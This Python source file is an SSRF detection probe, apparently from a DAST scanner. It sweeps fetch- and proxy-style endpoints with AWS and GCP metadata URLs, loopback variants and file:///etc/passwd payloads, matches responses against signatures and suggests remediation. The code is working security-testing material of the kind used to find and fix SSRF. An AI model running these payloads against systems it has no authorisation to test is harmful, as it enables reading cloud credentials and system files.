#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
SSRF: generic URL-accepting parameter sweep against internal /
cloud-metadata targets.

Existing SSRF probes are app-specific (`ssrf_profile_image_url`,
`ssrf_url_field_persisted`). This one is the catch-all generic
sweep: it tries a small list of well-known fetch / proxy / preview
endpoints (`/api/fetch?url=...`, `/proxy?target=...`, etc.) with a
list of canonical SSRF targets:

  - http://169.254.169.254/latest/meta-data/   (AWS / OpenStack)
  - http://metadata.google.internal/...        (GCP)
  - http://127.0.0.1 / http://[::1] / http://0.0.0.0
  - http://2130706433                          (decimal-IP form of 127.0.0.1)
  - file:///etc/hostname

The high-fidelity rule is structural: we only declare validated=True
when the upstream's response body contains content that is unique to
the SSRF target -- AWS metadata's `ami-id`/`instance-id` lines, GCP
metadata's `Metadata-Flavor: Google` style markers, or the literal
hostname string for `file:///etc/hostname`. A 200 alone is never
enough.

Detection signal:
  GET fetch-shaped endpoint with one of the SSRF target URLs in the
  url parameter. Validate when response body matches a
  target-specific structural signature.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import quote, urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Endpoints that commonly accept a URL-shaped parameter. Same-origin
# only -- we never call out to a different host.
FETCH_ENDPOINTS: tuple[tuple[str, str], ...] = (
    ("/api/fetch", "url"),
    ("/api/proxy", "url"),
    ("/api/preview", "url"),
    ("/api/render", "url"),
    ("/fetch", "url"),
    ("/proxy", "url"),
    ("/preview", "url"),
    ("/render", "url"),
    ("/api/v1/fetch", "url"),
    ("/api/v1/proxy", "target"),
    ("/api/url", "u"),
    ("/api/image", "src"),
)

# Canonical SSRF targets paired with a body-content signature that
# proves the upstream actually fetched the internal resource. Keep
# the patterns strict: we want zero false positives.
SSRF_TARGETS: tuple[tuple[str, re.Pattern, str], ...] = (
    ("http://169.254.169.254/latest/meta-data/",
     re.compile(r"\b(?:ami-id|instance-id|instance-type|iam/|"
                r"public-ipv4|local-hostname)\b"),
     "AWS instance metadata"),
    ("http://169.254.169.254/computeMetadata/v1/",
     re.compile(r"Metadata-Flavor|computeMetadata|"
                r"projects/\d+/zones/", re.I),
     "GCP compute metadata"),
    ("http://[::1]/",
     re.compile(r"<title>.*localhost|"
                r"It works!|nginx|"
                r"Welcome to nginx|Apache.*Test Page", re.I),
     "IPv6 loopback content"),
    ("http://2130706433/",
     re.compile(r"<title>.*localhost|"
                r"It works!|nginx|"
                r"Welcome to nginx|Apache.*Test Page", re.I),
     "Decimal-IP loopback content"),
    ("file:///etc/hostname",
     # /etc/hostname is a single short token followed by a newline;
     # match on a strict shape so we don't false-positive on the
     # word 'localhost' appearing in random page content.
     re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9._-]{0,63}\s*$"),
     "Local /etc/hostname read"),
    ("file:///etc/passwd",
     re.compile(r"^root:[^:]*:0:0:", re.MULTILINE),
     "Local /etc/passwd read"),
)


class SsrfMetadataEndpointSweepProbe(Probe):
    name = "ssrf_metadata_endpoint_sweep"
    summary = ("Detects SSRF on URL-accepting endpoints by sweeping "
               "cloud-metadata, loopback, and file:// canonical "
               "targets.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--endpoint", action="append", default=[],
            help="Additional 'path:param' pair to sweep (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        # Build the full list of (path, param) pairs to sweep. User-
        # supplied "path:param" overrides extend the defaults.
        endpoints: list[tuple[str, str]] = list(FETCH_ENDPOINTS)
        for spec in (args.endpoint or []):
            if ":" in spec:
                p, _, q = spec.partition(":")
                endpoints.append((p.strip(), q.strip() or "url"))

        attempts: list[dict] = []
        confirmed: list[dict] = []
        # Step 1: discover which fetch endpoints actually exist on
        # this origin. We send a benign payload (a same-origin /robots.txt
        # ref) and only continue with endpoints that don't 404. This
        # keeps the request budget tight.
        live_endpoints: list[tuple[str, str]] = []
        for path, param in endpoints:
            url = urljoin(origin, path) + "?" + param + "=" + quote(
                urljoin(origin, "/robots.txt"))
            r = client.request("GET", url)
            row = {"step": "discovery", "path": path, "param": param,
                   "status": r.status, "size": r.size}
            attempts.append(row)
            # 200 / 4xx-with-body / redirect = endpoint exists in some
            # form. 404 = skip. We avoid sweeping every SSRF target
            # against every dead path.
            if r.status not in (404, 0):
                live_endpoints.append((path, param))
            if len(live_endpoints) >= 4:
                break

        # Step 2: for each live endpoint, try the SSRF targets and
        # require a structural body match before declaring confirmed.
        for path, param in live_endpoints:
            for target_url, sig_re, label in SSRF_TARGETS:
                full = (urljoin(origin, path) + "?" + param + "="
                        + quote(target_url, safe=""))
                r = client.request("GET", full)
                row = {"step": "ssrf", "path": path, "param": param,
                       "target": target_url, "label": label,
                       "status": r.status, "size": r.size}
                if r.status == 200 and r.body:
                    text = (r.text or "").strip()
                    # Body must be small enough to have come from the
                    # SSRF target rather than a generic error page,
                    # AND match the structural signature.
                    if sig_re.search(text):
                        row["matched"] = label
                        row["snippet"] = text[:200]
                        confirmed.append(row)
                        attempts.append(row)
                        # Two confirmed targets is more than enough
                        # signal; stop early to respect the budget.
                        if len(confirmed) >= 2:
                            break
                        continue
                attempts.append(row)
            if len(confirmed) >= 2:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            top = confirmed[0]
            return Verdict(
                validated=True, confidence=0.93,
                summary=(
                    f"Confirmed: SSRF on {origin}{top['path']} "
                    f"(parameter `{top['param']}`). Server fetched "
                    f"`{top['target']}` and returned content matching "
                    f"the {top['label']} signature -- the upstream is "
                    "willing to dereference attacker-supplied URLs "
                    "against internal / metadata targets."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Refuse user-supplied URLs that resolve to "
                    "private / link-local / loopback / metadata "
                    "ranges before issuing the fetch.\n"
                    "  - Allowlist target hosts where possible "
                    "(specific S3 bucket, image CDN, etc.).\n"
                    "  - Resolve the hostname yourself first, then "
                    "reject if the resolved IP is in 169.254/16, "
                    "127/8, 10/8, 172.16/12, 192.168/16, or any "
                    "IPv6 link-local / unique-local range.\n"
                    "  - Block `file://`, `gopher://`, `dict://`, "
                    "and other non-http(s) schemes.\n"
                    "  - On AWS, require IMDSv2 (token-based) so a "
                    "blind SSRF cannot reach metadata via GET."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(live_endpoints)} live "
                     f"fetch-shaped endpoint(s) on {origin} against "
                     f"{len(SSRF_TARGETS)} canonical SSRF targets; "
                     "no response body matched a target signature."),
            evidence=evidence,
        )


if __name__ == "__main__":
    SsrfMetadataEndpointSweepProbe().main()
